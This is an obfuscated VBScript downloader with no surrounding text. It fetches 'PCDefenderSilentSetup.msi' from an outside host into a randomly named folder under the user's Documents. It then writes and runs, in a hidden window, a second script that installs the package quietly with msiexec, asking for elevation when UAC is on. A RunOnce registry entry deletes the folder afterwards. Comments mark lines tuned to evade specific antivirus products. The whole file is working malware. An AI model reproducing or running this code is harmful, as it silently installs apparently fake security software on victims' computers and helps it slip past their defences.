Dim x67r6c728SQm0GpF, GWiH0l
c6PU2M2Lfm3Ln60s6mYW = "" & R9n5YkiE1a3hcHIaaZIoD2S & "\" & T5nPwG7yiP25y6 ' <- NOD32
Set x67r6c728SQm0GpF = CreateObject("Scripting.FileSystemObject")
Set GWiH0l = x67r6c728SQm0GpF.CreateFolder(c6PU2M2Lfm3Ln60s6mYW)

cqIS4mK = "http://kaksosat.info/PCDefenderSilentSetup.msi"
V7o5q4aF = "" & T5nPwG7yiP25y6 & ".msi"
S51M7Di8C1 cqIS4mK, c6PU2M2Lfm3Ln60s6mYW, V7o5q4aF ' <- KIS

EIp211TiZv1JOl9zF = "Dim Nx79AuF6XVm8w5, L8FRnyFsVX633Sf7DV2i20RX, qDy4N, uUg715V, mWJHuk8o8HL2, q9kYpMtN0NuwW3UPrH70pm1v" & vbCr & vbLf & _
    "Set Nx79AuF6XVm8w5 = CreateObject(""WScript.Shell"")" & vbCr & vbLf & _
    "L8FRnyFsVX633Sf7DV2i20RX = Nx79AuF6XVm8w5.ExpandEnvironmentStrings(""%OS%"")" & vbCr & vbLf & _
    "If L8FRnyFsVX633Sf7DV2i20RX = ""Windows_NT"" Then" & vbCr & vbLf & _
    "   qDy4N = ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\""" & vbCr & vbLf & _
    "   uUg715V = Nx79AuF6XVm8w5.regread(qDy4N & ""CurrentVersion"")" & vbCr & vbLf & _
    "Else" & vbCr & vbLf & _
    "  qDy4N = ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\""" & vbCr & vbLf & _
    "  uUg715V = Nx79AuF6XVm8w5.regread(qDy4N & ""VersionNumber"")" & vbCr & vbLf & _
    "End if" & vbCr & vbLf & _
    "uUg715V = Mid(uUg715V,1,1)" & vbCr & vbLf & _
    "If (uUg715V = 6) Then" & vbCr & vbLf & _
    "   mWJHuk8o8HL2 = ""HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\""" & vbCr & vbLf & _
    "   q9kYpMtN0NuwW3UPrH70pm1v = Nx79AuF6XVm8w5.regread(mWJHuk8o8HL2 & ""EnableLUA"")" & vbCr & vbLf & _
    "End If" & vbCr & vbLf & _
    "Set Nx79AuF6XVm8w5 = Nothing" & vbCr & vbLf & _
    "Set Nx79AuF6XVm8w5 = CreateObject(""Shell.Application"")" & vbCr & vbLf & _
	"If ((uUg715V = 6) AND (q9kYpMtN0NuwW3UPrH70pm1v = 1)) Then" & vbCr & vbLf & _
	"   Nx79AuF6XVm8w5.ShellExecute ""msiexec"", "" /i "" & Chr(34) & """&V7o5q4aF&""" & Chr(34) & "" /quiet"", """", ""runas"", 1" & vbCr & vbLf & _
    "   Set Nx79AuF6XVm8w5 = Nothing" & vbCr & vbLf & _
    "Else" & vbCr & vbLf & _
	"   Nx79AuF6XVm8w5.ShellExecute ""msiexec"", "" /i "" & Chr(34) & """&V7o5q4aF&""" & Chr(34) & "" /quiet"", """", ""open"", 1" & vbCr & vbLf & _
    "   Set Nx79AuF6XVm8w5 = Nothing" & vbCr & vbLf & _
    "End If"
ylt1D8Q226f57hI6 = c6PU2M2Lfm3Ln60s6mYW & "\" & T5nPwG7yiP25y6 & ".vbs"
Set EbcJR0fwH3By1JU5 = x67r6c728SQm0GpF.OpenTextFile(ylt1D8Q226f57hI6, 8, True)
EbcJR0fwH3By1JU5.WriteLine(EIp211TiZv1JOl9zF)
EbcJR0fwH3By1JU5.Close

dim O0P44HOmsA4b13wR6C6kBmJ
set O0P44HOmsA4b13wR6C6kBmJ = CreateObject("Shell.Application")
O0P44HOmsA4b13wR6C6kBmJ.ShellExecute "wscript", """" & ylt1D8Q226f57hI6 & """", "", "open", 0 ' <- McAfee
set O0P44HOmsA4b13wR6C6kBmJ = nothing

Gdm3yQN1rQmifn c6PU2M2Lfm3Ln60s6mYW


Function S51M7Di8C1(yW10B, TTf993xlwnXR6Nn3, oSc2rRKdD9qm4sNjNkk)
   Dim d3TTRvuSK, vwLYN3LvCJD05
   
   yW10B = Replace(yW10B,"\","/")

   'If len(oSc2rRKdD9qm4sNjNkk) = 0 Then ' <- KIS
   '   Exit Function 
   'End If

   Set d3TTRvuSK = CREATEOBJECT("Microsoft.XMLHTTP") 
   d3TTRvuSK.open "GET", yW10B, "False" 

   d3TTRvuSK.send 
   If d3TTRvuSK.statustext = "OK" Then 
      Set vwLYN3LvCJD05 = CreateObject("ADODB.Stream") 
      vwLYN3LvCJD05.type = 1 
      vwLYN3LvCJD05.Open 
      vwLYN3LvCJD05.Write d3TTRvuSK.responseBody 

      if len(TTf993xlwnXR6Nn3) > 0 Then oSc2rRKdD9qm4sNjNkk = TTf993xlwnXR6Nn3 & "\" & oSc2rRKdD9qm4sNjNkk 
      vwLYN3LvCJD05.SaveToFile oSc2rRKdD9qm4sNjNkk, 2 
      vwLYN3LvCJD05.Close 
      Set vwLYN3LvCJD05 = Nothing 
      S51M7Di8C1 = 1
   End if 
   Set d3TTRvuSK = Nothing
End Function


Function T5nPwG7yiP25y6
	j4n7hHT2 = 14
	VT139AWOiGFL9D = 7

	Randomize  
	z7M5wmrf4m = Int(((j4n7hHT2 - VT139AWOiGFL9D + 1) * Rnd) _
	    + j4n7hHT2)  

	j4n7hHT2 = 90
	VT139AWOiGFL9D = 65
	
	For i = 1 to z7M5wmrf4m
	    Randomize
	    h458Ag6FYb3jmZgvzY = Int(((j4n7hHT2 - VT139AWOiGFL9D + 1) * Rnd) _
	        + VT139AWOiGFL9D)  
	    uXEI9vFUO5e4wSAls9VGSJx7f = uXEI9vFUO5e4wSAls9VGSJx7f & Chr(h458Ag6FYb3jmZgvzY)
	Next
	
	T5nPwG7yiP25y6 = uXEI9vFUO5e4wSAls9VGSJx7f
End Function


Function R9n5YkiE1a3hcHIaaZIoD2S
	Set l6m04u7oa74jnxFzZ64Yz09M = Wscript.CreateObject("Wscript.Shell")
	R9n5YkiE1a3hcHIaaZIoD2S = l6m04u7oa74jnxFzZ64Yz09M.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Personal")
End Function


Function Gdm3yQN1rQmifn(QI01u0K8)
	Set TdO0MFKTQqMr5mh1 = Wscript.CreateObject("Wscript.Shell")
	TdO0MFKTQqMr5mh1.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\deletepcdefmsi", "cmd /c rmdir /s /q """ & QI01u0K8 & """", "REG_SZ"
End Function
